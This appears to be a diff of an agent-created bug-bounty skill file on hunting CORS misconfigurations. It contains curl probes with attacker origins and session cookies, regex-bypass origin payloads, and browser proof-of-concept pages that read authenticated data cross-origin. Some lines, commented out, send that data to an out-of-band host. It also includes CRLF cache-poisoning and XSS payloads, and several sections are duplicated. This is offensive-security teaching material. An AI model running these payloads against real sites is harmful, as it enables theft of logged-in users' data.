@@ -4,11 +4,11 @@ description: "Hunt origin reflection, null-origin trust, regex bypasses, preflig
 agent_created: true
 ---
 
-# CORS misconfiguration hunting — unified methodology
+# CORS misconfiguration hunting — unified skill
 
-> **Unified skill.** Built from 2 upstream skills across cbh, hunting. Full originals are in `references/upstream-*.md`; the deduplicated union is in `references/unified-method.md`.
+> **Complete merged skill.** Everything from 2 upstream skills across cbh, hunting is contained in this file. Unmodified originals remain in `references/` for provenance only.
 
-## Unified upstream methodology (deduplicated)
+## Unified upstream methodology (complete, deduplicated)
 
 ### Discovery and hunting method
 
@@ -19,7 +19,9 @@ agent_created: true
 - The exploitability gate is BOTH `Access-Control-Allow-Origin` reflecting your test origin AND `Access-Control-Allow-Credentials: true`. `ACAO: *` plus `ACAC: true` is blocked by browsers — a non-finding for credentialed theft. `ACAO: null` without credentials is usually low impact (see network-position exception below).
 - Check for missing `Vary: Origin` on dynamically generated ACAO. It enables client-side and server-side cache poisoning: a reflected-header XSS (`X-User-id`, `Origin` with `\r`) can be cached and later rendered on a direct navigation.
 - Probe preflight (`OPTIONS` with `Origin`, `Access-Control-Request-Method`, `Access-Control-Request-Headers`) on APIs that use PUT/DELETE/custom auth headers — a permissive preflight means the attacker origin can issue authenticated state changes, not just reads.
-- Look for the "context-dependent trust" case: the app doesn't trust itself but trusts related domains/subdomains. A dangling CNAME in a trusted subdomain then becomes a CORS read primitive (cross-
+- Look for the "context-dependent trust" case: the app doesn't trust itself but trusts related domains/subdomains. A dangling CNAME in a trusted subdomain then becomes a CORS read primitive (cross-reference subdomain-takeover).
+- Check for Private Network Access behavior: `Access-Control-Request-Private-Network: true` in preflight, `Access-Control-Allow-Private-Network: true` in response. Chrome's PNA rollout has been in flux — test both the compliant flow and the "incomplete enforcement" behavior; `0.0.0.0` and public-IP-from-LAN quirks are version-dependent.
+- Inventory adjacent primitives that bypass CORS entirely: JSONP/`callback` params (XSSI), CORS-escape proxies (no victim credentials), and origin checks inside postMessage handlers.
 
 ### Signals and surfaces
 
@@ -86,7 +88,26 @@ and produces false negatives.
 | `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
 | `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
 | `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
-| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unu
+| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unusual origins. Confirm the browser actually sends it. |
+
+```bash
+# Send each class-specific payload and watch what the server reflects.
+for ORIGIN in \
+  "https://evil.target.com" \
+  "https://eviltarget.com" \
+  "https://x.target.com.evil.com" \
+  "https://target.com.evil.com" \
+  "https://target.com%60.evil.com" \
+  "http://target.com"; do
+  RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
+    -H "Origin: $ORIGIN" \
+    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
+  echo "[$ORIGIN] -> ${RESULT:-no CORS}"
+done
+```
+A bypass is real only if the server reflects **your registerable origin** into
+`ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a bug unless
+you can actually control a `*.target.com` host (then see Phase 6 / subdomain-takeover).
 
 ### Phase 4 — Pre-flight (OPTIONS) gating bypass
 
@@ -145,7 +166,16 @@ curl -s -D - -o /dev/null -X OPTIONS "https://$TARGET/api/account/email" \
   - startswith checks: `https://target.evil.com`, `https://target@evil.com`
   - loopback normalizations: `127.1`, `0`, `0x7f000001`, IPv6 forms when localhost/metadata is string-blocked.
 - Trusted insecure protocol: application over HTTPS but ACAO reflects `http://target.evil.com` -> active MITM bypasses HTTPS; HSTS/Secure cookies do not help.
-- XSS on a whitelisted subdomain:
+- XSS on a whitelisted subdomain: if `*.requester.com` is trusted and `sub.requester.com` has XSS, run the CORS script from that subdomain to read `provider.com`.
+- Server-side cache poisoning via Origin CRLF (IE/Edge treat `\r` as header terminator):
+  ```
+  GET / HTTP/1.1
+  Origin: z[0x0d]Content-Type: text/html; charset=UTF-7
+  ```
+  A server-side cache may store the split response and serve a UTF-7 XSS to others.
+- Client-side cache poisoning without `Vary: Origin`: send a custom header reflected into HTML (`X-User-id: <svg/onload=alert(1)>`) with `withCredentials`, then navigate the browser to the URL so the cached response renders.
+- Non-credentialed but still impactful: use the victim's browser as a proxy to bypass IP auth for intranet apps (similar to DNS rebinding but simpler). DNS-rebinding variants (first-then-second, multiple A records, TTL expiry, DoH, CNAME-to-internal) also defeat IP/origin checks.
+- `callback`/JSONP parameter: if data comes back as `application/javascript`, `<script>` inclusion reads it despite CORS.
 
 ### Phase 3 — Subdomain / trusted-origin regex bypass
 
@@ -160,7 +190,26 @@ and produces false negatives.
 | `^https?://.*\.target\.com` | **Missing end-anchor `$`** | `https://x.target.com.evil.com` | regex matches a prefix; `.target.com` appears, then `.evil.com` is ignored (no `$`). |
 | `^https?://target\.com` | **Prefix-only, no `$`** | `https://target.com.evil.com` | matches the `target.com` prefix; the rest is unconstrained. |
 | `^https?://.*\.target\.com$` but dot in regex is **unescaped** (`.*.target.com$`) | **Unescaped dot** = "any char" | `https://xtargetXcom...` style, or `https://evilZtargetZcom` where `Z` is any single char | `.` matches any character, widening the match. |
-| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unu
+| Any of the above | **Special chars browsers send in Origin** | `https://target.com%60.evil.com`, `https://target.com\x60evil.com` | some parsers treat backtick/underscore as letters; Safari/older browsers may emit unusual origins. Confirm the browser actually sends it. |
+
+```bash
+# Send each class-specific payload and watch what the server reflects.
+for ORIGIN in \
+  "https://evil.target.com" \
+  "https://eviltarget.com" \
+  "https://x.target.com.evil.com" \
+  "https://target.com.evil.com" \
+  "https://target.com%60.evil.com" \
+  "http://target.com"; do
+  RESULT=$(curl -s -D - -o /dev/null "https://$TARGET/api/me" \
+    -H "Origin: $ORIGIN" \
+    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
+  echo "[$ORIGIN] -> ${RESULT:-no CORS}"
+done
+```
+A bypass is real only if the server reflects **your registerable origin** into
+`ACAO` with `ACAC: true`. `evil.target.com` reflecting back is NOT a bug unless
+you can actually control a `*.target.com` host (then see Phase 6 / hunt-subdomain).
 
 ### Validation and proof
 
@@ -190,7 +239,7 @@ and produces false negatives.
 - Null-origin + sensitive authed body, browser-proven: Medium–High
 - Subdomain-takeover/XSS-assisted credentialed read: High/Critical
 - Reflects origin, no credentials / non-sensitive: Low–Informational
-- `ACAO: *` onl
+- `ACAO: *` only (no creds possible): Informational unless data is secret
 
 ### C. Validation / proof bar — how to confirm and avoid false positives
 
@@ -230,14 +279,207 @@ and produces false negatives.
 
 ---
 
+### Sources and related reading
+
+### D. Sources — numbered list of URLs you actually fetched
+
+1. https://portswigger.net/research/exploiting-cors-misconfigurations-for-bitcoins-and-bounties
+2. https://hacktricks.wiki/en/pentesting-web/cors-bypass.html
+3. https://portswigger.net/web-security/cors
+4. https://portswigger.net/research/introducing-the-url-validation-bypass-cheat-sheet
+5. https://portswigger.net/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet
+6. https://www.vaadata.com/en/blog/understanding-and-preventing-cors-misconfiguration
+7. https://www.intigriti.com/researchers/blog/hacking-tools/exploiting-cors-misconfiguration-vulnerabilities
+
+### Additional notes
+
+### What actually pays (and what does not)
+
+CORS pays High **only** when an attacker-controlled origin can perform a
+**credentialed** cross-origin read of sensitive authenticated data, and you
+have a browser PoC proving the response body is readable from `evil.com`.
+
+Two hard browser rules that kill most "findings" — check these FIRST:
+
+- **`Access-Control-Allow-Origin: *` CANNOT be combined with credentials.**
+  If the server returns `ACAO: *`, the browser refuses to send/expose the
+  response for a `credentials: include` request. A wildcard-only endpoint is
+  **not** credential-exploitable. It is only interesting if the data it serves
+  is sensitive *without* a session (rare) — usually this is Informational/Low.
+- **`Access-Control-Allow-Credentials: true` is meaningless on its own.** It
+  matters only if `ACAO` reflects/allows your specific attacker origin AND a
+  cross-origin credentialed `fetch` actually returns a readable body. ACAC on a
+  response that does not reflect your origin proves nothing.
+
+If you cannot demonstrate a readable cross-origin authed body in a real
+browser, you do not have a High. Do not submit header-diffing alone.
+
+---
+
+### Phase 1 — Discover CORS endpoints
+
+```bash
+# Probe API endpoints. Use GET (not -I): some servers only emit CORS on GET,
+# and -I sends HEAD which may be handled differently.
+while read url; do
+  result=$(curl -s -D - -o /dev/null "$url" \
+    -H "Origin: https://evil.com" \
+    -H "Cookie: $SESSION_COOKIE" | grep -i "access-control")
+  [ -n "$result" ] && echo "=== $url ===" && echo "$result"
+done < recon/$TARGET/api-endpoints.txt
+
+# httpx bulk check
+cat recon/$TARGET/live-hosts.txt | awk '{print $1}' | \
+  httpx -H "Origin: https://evil.com" -match-string "access-control-allow-origin"
+```
+
+### Phase 2 — Reflect-any-origin + null origin
+
+```bash
+# Does the server reflect an arbitrary Origin back?
+curl -s -D - -o /dev/null https://$TARGET/api/me \
+  -H "Origin: https://evil.com" \
+  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
+
+# Vulnerable (the High case):
+#   Access-Control-Allow-Origin: https://evil.com   <- reflects attacker origin
+#   Access-Control-Allow-Credentials: true          <- + credentials => readable
+#
+# NOT exploitable for credentialed theft:
+#   Access-Control-Allow-Origin: *                   <- browser blocks creds read
+#   (no ACAC, or ACAC absent)                        <- not credentialed
+
+# Null-origin trust
+curl -s -D - -o /dev/null https://$TARGET/api/me \
+  -H "Origin: null" \
+  -H "Cookie: $SESSION_COOKIE" | grep -i "access-control"
+# Looking for:  Access-Control-Allow-Origin: null  +  ACAC: true
+```
+
+### Phase 3b — Trusted insecure (HTTP) origin
+
+If ACAO reflects/allows any `http://` origin (even a correctly-anchored in-scope one) with ACAC:true, a network attacker on that cleartext host injects a page that reads the authed cross-origin body — no regex flaw needed, the plaintext scheme IS the flaw.
+```bash
+curl -s -D- -o/dev/null "https://$TARGET/api/me" -H "Origin: http://sub.$TARGET" -H "Cookie: $SESSION" | grep -i access-control
+```
+Real only if a MITM can occupy that http origin (no HSTS-preload). Pair with `tls-network`. (PortSwigger: CORS with trusted insecure protocols.)
+
+### Phase 5 — Browser PoCs (the only thing that proves impact)
+
+curl does NOT enforce CORS — it will happily show you a reflected header even
+when a browser would block the read. **Every CORS High needs a browser PoC.**
+
+**5a. Reflect-any-origin read** (host on evil.com, open while logged into target):
+```html
+<!doctype html><body><pre id="out"></pre>
+<script>
+fetch("https://TARGET/api/me", {credentials: "include"})
+  .then(r => r.text())
+  .then(d => {
+    document.getElementById("out").innerText = d;        // prove readable body
+    // OOB proof: fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(d));
+  })
+  .catch(e => document.getElementById("out").innerText = "BLOCKED: " + e);
+</script></body>
+```
+If you see `BLOCKED` / a TypeError, the browser refused the read — it is NOT a
+valid finding regardless of what curl showed (this is the `ACAO: *` + creds case).
+
+**5b. Null-origin read** — a `sandbox` iframe sends `Origin: null`. The inner
+document must lack `allow-same-origin` so its origin is opaque (`null`):
+```html
+<!doctype html><body>
+<!-- Outer page hosted anywhere -->
+<iframe sandbox="allow-scripts" srcdoc='
+  <script>
+    fetch("https://TARGET/api/me", {credentials: "include"})
+      .then(r => r.text())
+      .then(d => parent.postMessage(d, "*"));
+  &lt;/script&gt;'></iframe>
+<script>
+window.addEventListener("message", e => {
+  // d is the authed body, read cross-origin via a null Origin
+  // fetch("https://OOB-ID.oastify.com/?d="+encodeURIComponent(e.data));
+  console.log("NULL-ORIGIN READ:", e.data);
+});
+</script></body>
+```
+(Alternative null-origin emitters: a `data:` / `blob:` document, or bouncing the
+request through a 302 redirect chain whose final hop is cross-scheme.)
+
+**5c. Trusted-subdomain read** — once you control a host that the regex trusts
+(real subdomain via takeover, or a registerable origin that matches a buggy
+regex from Phase 3), host **5a** there. The reflected origin is now an origin
+you legitimately serve, so the browser allows the read.
+
+### Phase 6 — postMessage origin check
+
+```bash
+# Find message handlers that don't strictly validate event.origin.
+grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
+  | grep -v "\.origin"
+# Then audit each hit: does it check event.origin against an allowlist
+# BEFORE using event.data? Weak checks to flag:
+#   .indexOf("target.com") > -1      <- "target.com.evil.com" passes
+#   .endsWith("target.com")          <- "eviltarget.com" passes
+#   startsWith("https://target")     <- "https://target.evil.com" passes
+#   no check at all
+```
+postMessage is a separate class from HTTP CORS — impact is DOM-side (XSS,
+client-side auth bypass). See dom for exploitation depth.
+
+---
+
+### Automation (triage only — never the proof)
+
+```bash
+# corsy — fast reflection/null/pre-domain checks
+pip3 install corsy
+corsy -u https://$TARGET -t 10 --headers "Cookie: $SESSION_COOKIE"
+
+# nuclei CORS templates
+nuclei -u https://$TARGET -t http/misconfiguration/cors/
+
+# Burp: passively flags origin reflection; always re-confirm in a real browser.
+```
+Every automated hit is a lead, not a finding. Reproduce 5a/5b in a browser.
+
+---
+
+### Phase 3b — Trusted insecure (HTTP) origin
+
+If ACAO reflects/allows any `http://` origin (even a correctly-anchored in-scope one) with ACAC:true, a network attacker on that cleartext host injects a page that reads the authed cross-origin body — no regex flaw needed, the plaintext scheme IS the flaw.
+```bash
+curl -s -D- -o/dev/null "https://$TARGET/api/me" -H "Origin: http://sub.$TARGET" -H "Cookie: $SESSION" | grep -i access-control
+```
+Real only if a MITM can occupy that http origin (no HSTS-preload). Pair with `hunt-tls-network`. (PortSwigger: CORS with trusted insecure protocols.)
+
+### Phase 6 — postMessage origin check
+
+```bash
+# Find message handlers that don't strictly validate event.origin.
+grep -rEn "addEventListener\(['\"]message" recon/$TARGET/ --include="*.js" \
+  | grep -v "\.origin"
+# Then audit each hit: does it check event.origin against an allowlist
+# BEFORE using event.data? Weak checks to flag:
+#   .indexOf("target.com") > -1      <- "target.com.evil.com" passes
+#   .endsWith("target.com")          <- "eviltarget.com" passes
+#   startsWith("https://target")     <- "https://target.evil.com" passes
+#   no check at all
+```
+postMessage is a separate class from HTTP CORS — impact is DOM-side (XSS,
+client-side auth bypass). See hunt-dom for exploitation depth.
+
+---
+
 ## Source skills merged into this topic
 
 - `hunting` — `cors`
 - `cbh` — `hunt-cors`
 
-## References
+## Provenance
 
-- `references/unified-method.md` — complete deduplicated union of all upstream sections
-- `references/upstream-*.md` — full original SKILL.md from each contributing repo
+- `references/unified-method.md` — same deduplicated union as this file, for tooling
+- `references/upstream-*.md` — unmodified original SKILL.md from each repo
 - `../../upstream/` — complete unmodified archives of all five source repositories
 - `bbhunt-methodology` — orchestrator, state machine and class router
